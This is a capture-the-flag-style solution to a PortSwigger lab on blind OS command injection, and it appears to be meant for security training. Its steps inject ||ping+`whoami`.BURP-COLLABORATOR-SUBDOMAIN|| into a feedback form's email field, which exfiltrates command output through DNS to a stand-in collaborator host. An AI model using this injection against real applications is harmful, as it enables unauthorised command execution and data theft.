# Lab-6: [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain. 

To solve the lab, execute the ``` whoami ``` command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab. 



## Solution
- Submit a feedback and intercept it using **burp suite** then send it to **repeater**.

- Append the following with **email** then forward the request.
    ``` ||ping+`whoami`.BURP-COLLABORATOR-SUBDOMAIN|| ``` replace the collaborator subdomain before forwarding.

- Go to collaborator tab in **burp suite** and click **Poll now**.

- A request will be made in the collaborator, click the **DNS** request and from the description copy the current user name **(** user name will be separated by a ``` . ``` **)**.

- Go to the website and submit the username as solution.